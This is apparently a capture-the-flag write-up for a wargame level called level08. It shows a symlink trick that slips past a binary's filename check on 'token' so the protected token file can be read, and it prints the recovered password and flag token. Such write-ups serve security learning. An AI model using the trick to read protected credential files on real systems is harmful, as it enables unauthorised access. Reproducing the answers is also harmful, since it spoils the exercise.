# Binary file and a file where we have no permissions.
- ./level08 [file to read]
- ./level08 token
- try with another file : ./level08 .profile: Permission denied

# So we should create a temporary token file because:
- there is a strstr function that compare the string in parameter with "token"
<!-- - echo 'toto' > /tmp/toto/token -->

# Create a symbolic link
ln -s $(pwd)/token /tmp/password && ./level08 /tmp/password
ls -l /tmp/password

```bash
su flag08
quif5eloekouj29ke0vouxean
getflag
```

# Token obtained:
token = 25749xKZ8L7DkSCwJkT9dyv6f
